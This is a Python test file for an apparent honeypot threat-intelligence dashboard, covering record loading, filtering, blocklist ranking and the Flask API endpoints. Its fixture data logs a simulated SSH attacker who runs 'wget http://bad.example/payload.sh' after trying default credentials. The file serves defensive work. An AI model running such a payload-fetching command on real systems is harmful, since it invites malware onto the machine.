from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from honeypot_pipeline.dashboard import create_app
from honeypot_pipeline.dashboard_data import filter_records, load_dataset
from honeypot_pipeline.reporting import build_blocklist_entries, collect_blocklist_ips, get_malicious_records, is_block_candidate


def _write_records(path: Path) -> None:
    records = [
        {
            "timestamp": "2026-03-18T12:05:00.000000Z",
            "event_type": "cowrie.command.input",
            "source_ip": "198.51.100.24",
            "username": "root",
            "password": "toor",
            "session_id": "abc124",
            "command": "wget http://bad.example/payload.sh",
            "url": "http://bad.example/payload.sh",
            "protocol": "ssh",
            "classification": {
                "attack_category": "malware_download",
                "severity": "high",
            },
            "threat_intel": {
                "status": "completed",
                "score": {
                    "is_malicious": True,
                    "confidence": "high",
                },
            },
            "raw_event": {
                "eventid": "cowrie.command.input",
            },
        },
        {
            "timestamp": "2026-03-18T12:00:00.000000Z",
            "event_type": "cowrie.login.failed",
            "source_ip": "203.0.113.10",
            "username": "admin",
            "password": "admin",
            "session_id": "abc123",
            "command": "",
            "url": None,
            "protocol": "ssh",
            "classification": {
                "attack_category": "brute_force",
                "severity": "medium",
            },
            "threat_intel": {
                "status": "completed",
                "score": {
                    "is_malicious": False,
                    "confidence": "low",
                },
            },
            "raw_event": {
                "eventid": "cowrie.login.failed",
            },
        },
    ]

    with path.open("w", encoding="utf-8") as handle:
        handle.write(json.dumps(records[0]))
        handle.write("\n")
        handle.write("not-json\n")
        handle.write(json.dumps(records[1]))
        handle.write("\n")


class DashboardDataTests(unittest.TestCase):
    def test_load_dataset_skips_malformed_lines_and_derives_summary(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)

            dataset = load_dataset(records_path)

        self.assertEqual(dataset.skipped_lines, 1)
        self.assertEqual(len(dataset.records), 2)
        self.assertEqual(dataset.records[0]["source_ip"], "198.51.100.24")
        self.assertEqual(dataset.summary["total_events"], 2)

    def test_filter_records_respects_filters(self) -> None:
        records = [
            {
                "source_ip": "198.51.100.24",
                "event_type": "cowrie.command.input",
                "protocol": "ssh",
                "classification": {"attack_category": "malware_download"},
                "threat_intel": {"score": {"is_malicious": True}},
            },
            {
                "source_ip": "203.0.113.10",
                "event_type": "cowrie.login.failed",
                "protocol": "ssh",
                "classification": {"attack_category": "brute_force"},
                "threat_intel": {"score": {"is_malicious": False}},
            },
        ]

        filtered = filter_records(
            records,
            attack_category="malware_download",
            malicious_only=True,
        )

        self.assertEqual(len(filtered), 1)
        self.assertEqual(filtered[0]["source_ip"], "198.51.100.24")

    def test_reporting_helpers_collect_malicious_records_and_blocklist(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            dataset = load_dataset(records_path)

        malicious_records = get_malicious_records(dataset.records)
        blocklist_ips = collect_blocklist_ips(dataset.records)

        self.assertEqual(len(malicious_records), 1)
        self.assertEqual(blocklist_ips, ["198.51.100.24", "203.0.113.10"])

    def test_build_blocklist_entries_orders_highest_threat_first(self) -> None:
        records = [
            {
                "source_ip": "198.51.100.50",
                "timestamp": "2026-03-18T12:10:00.000000Z",
                "event_type": "cowrie.command.input",
                "classification": {"attack_category": "malware_download", "severity": "high"},
                "threat_intel": {"score": {"is_malicious": True, "confidence": "high"}},
            },
            {
                "source_ip": "203.0.113.10",
                "timestamp": "2026-03-18T12:11:00.000000Z",
                "event_type": "cowrie.login.failed",
                "classification": {"attack_category": "brute_force", "severity": "medium"},
                "threat_intel": {"score": {"is_malicious": True, "confidence": "low"}},
            },
        ]

        entries = build_blocklist_entries(records)

        self.assertEqual([entry["ip"] for entry in entries], ["198.51.100.50", "203.0.113.10"])
        self.assertGreater(entries[0]["threat_score"], entries[1]["threat_score"])
        self.assertEqual(collect_blocklist_ips(records), ["198.51.100.50", "203.0.113.10"])

    def test_local_high_risk_record_is_block_candidate_without_threat_intel(self) -> None:
        record = {
            "source_ip": "192.0.2.44",
            "timestamp": "2026-03-18T12:12:00.000000Z",
            "event_type": "cowrie.login.failed",
            "classification": {"attack_category": "brute_force", "severity": "medium"},
        }

        self.assertTrue(is_block_candidate(record))
        self.assertEqual(collect_blocklist_ips([record]), ["192.0.2.44"])


class DashboardJSONAPITests(unittest.TestCase):
    def test_api_summary_returns_data(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/summary")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertEqual(data["total_events"], 2)
        self.assertEqual(data["unique_source_ips"], 2)
        self.assertIn("brute_force", data["by_attack_category"])
        self.assertIn("malware_download", data["by_attack_category"])

    def test_api_events_applies_filters(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/events?source_ip=203.0.113.10")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertEqual(len(data["records"]), 1)
        self.assertEqual(data["records"][0]["source_ip"], "203.0.113.10")

    def test_api_event_detail_returns_event(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/events/1")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        classification = data.get("classification") or {}
        self.assertIn(classification.get("attack_category", ""), ["malware_download", "brute_force"])

    def test_api_event_detail_404_on_missing(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/events/9999")

        self.assertEqual(response.status_code, 404)

    def test_export_routes_return_downloadable_outputs(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                blocklist_response = client.get("/api/exports/blocklist.txt")
                malicious_response = client.get("/api/exports/malicious.json")
                report_response = client.get("/api/exports/report.md")

        self.assertEqual(blocklist_response.status_code, 200)
        self.assertIn("198.51.100.24", blocklist_response.get_data(as_text=True))
        self.assertEqual(malicious_response.status_code, 200)
        self.assertIn('"malicious_record_count": 1', malicious_response.get_data(as_text=True))
        self.assertEqual(report_response.status_code, 200)
        self.assertIn("# Honeypot Threat Intelligence Report", report_response.get_data(as_text=True))

    def test_top_threats_returns_data(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/top-threats")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertGreater(len(data["threats"]), 0)

    def test_blocklist_candidates_returns_sorted_data(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            records = [
                {
                    "timestamp": "2026-03-18T12:10:00.000000Z",
                    "event_type": "cowrie.command.input",
                    "source_ip": "198.51.100.50",
                    "classification": {"attack_category": "malware_download", "severity": "high"},
                    "threat_intel": {"score": {"is_malicious": True, "confidence": "high"}},
                },
                {
                    "timestamp": "2026-03-18T12:11:00.000000Z",
                    "event_type": "cowrie.login.failed",
                    "source_ip": "203.0.113.10",
                    "classification": {"attack_category": "brute_force", "severity": "medium"},
                    "threat_intel": {"score": {"is_malicious": True, "confidence": "low"}},
                },
            ]
            records_path.write_text(
                "\n".join(json.dumps(record) for record in records) + "\n",
                encoding="utf-8",
            )
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/blocklist-candidates")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertEqual([item["ip"] for item in data["candidates"]], ["198.51.100.50", "203.0.113.10"])
        self.assertEqual(data["candidates"][0]["risk_level"], "critical")

    def test_blocklist_candidates_include_local_only_attacker_ips(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            records = [
                {
                    "timestamp": "2026-03-18T12:12:00.000000Z",
                    "event_type": "cowrie.login.failed",
                    "source_ip": "192.0.2.44",
                    "classification": {"attack_category": "brute_force", "severity": "medium"},
                }
            ]
            records_path.write_text(
                "\n".join(json.dumps(record) for record in records) + "\n",
                encoding="utf-8",
            )
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/blocklist-candidates")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertEqual([item["ip"] for item in data["candidates"]], ["192.0.2.44"])

    def test_sessions_endpoint_without_db(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            records_path = Path(tmpdir) / "records.jsonl"
            _write_records(records_path)
            app = create_app(records_path=records_path)

            with app.test_client() as client:
                response = client.get("/api/sessions")

        self.assertEqual(response.status_code, 200)
        data = response.get_json()
        self.assertIn("Database not configured", data.get("message", ""))


if __name__ == "__main__":
    unittest.main()
